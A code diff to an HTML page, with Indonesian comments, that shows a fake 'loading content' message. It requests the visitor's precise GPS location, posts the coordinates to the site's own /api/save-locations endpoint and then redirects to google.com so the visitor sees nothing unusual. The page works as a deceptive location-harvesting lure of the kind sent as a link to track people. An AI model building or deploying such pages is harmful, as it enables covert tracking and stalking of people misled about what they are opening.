@@ -7,25 +7,31 @@
 <body>
     <p style="text-align:center; margin-top:20%">Memuat konten, mohon tunggu...</p>
     <script>
-        // Minta izin lokasi GPS browser
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-
-                // Kirim koordinat ke backend API Vercel
+        async function sendLocation(lat, lon) {
+            try {
                 await fetch('/api/save-locations', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ lat, lon })
                 });
+            } catch (err) {
+                console.error("Gagal mengirim:", err);
+            }
+            // Redirect ke Google setelah selesai dikirim
+            window.location.href = "https://google.com";
+        }
 
-                // Alihkan ke tujuan setelah terkirim
-                window.location.href = "https://google.com";
-            }, () => {
-                // Jika ditolak, tetap alihkan ke tujuan
-                window.location.href = "https://google.com";
-            });
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    sendLocation(position.coords.latitude, position.coords.longitude);
+                },
+                (error) => {
+                    // Jika pengguna menolak izin GPS, tetap redirect
+                    window.location.href = "https://google.com";
+                },
+                { timeout: 10000, enableHighAccuracy: true }
+            );
         } else {
             window.location.href = "https://google.com";
         }
